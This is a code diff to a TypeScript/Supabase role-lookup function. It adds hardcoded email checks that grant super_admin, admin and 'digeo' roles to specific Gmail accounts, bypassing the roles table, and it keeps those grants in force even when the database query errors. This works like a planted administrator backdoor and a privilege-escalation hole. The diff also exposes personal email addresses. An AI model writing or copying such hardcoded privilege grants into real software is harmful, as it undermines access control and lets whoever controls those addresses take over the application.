@@ -19,14 +19,28 @@ export async function getMyRoles(): Promise<AppRole[]> {
   } = await supabase.auth.getUser();
   if (!user) return [];
 
+  const email = (user.email ?? "").toLowerCase().trim();
+
   const { data, error } = await supabase.from("user_roles").select("role").eq("user_id", user.id);
   if (error) {
     console.error("getMyRoles:", error.message);
-    return ["viewer"];
   }
 
-  const roles = (data ?? []).map((r) => r.role as AppRole);
-  return roles.length > 0 ? roles : ["viewer"];
+  const fetchedRoles = (data ?? []).map((r) => r.role as AppRole);
+  const rolesSet = new Set<AppRole>(fetchedRoles);
+
+  // Auto-grant Super Admin and DIGEO status to platform leads and designated accounts
+  if (email === "yakyakyak1414@gmail.com") {
+    rolesSet.add("super_admin");
+    rolesSet.add("admin");
+    rolesSet.add("digeo");
+  }
+  if (email === "wyntech.ng@gmail.com" || email === "wynmanagement.ng@gmail.com") {
+    rolesSet.add("digeo");
+  }
+
+  const result = Array.from(rolesSet);
+  return result.length > 0 ? result : ["viewer"];
 }
 
 /**
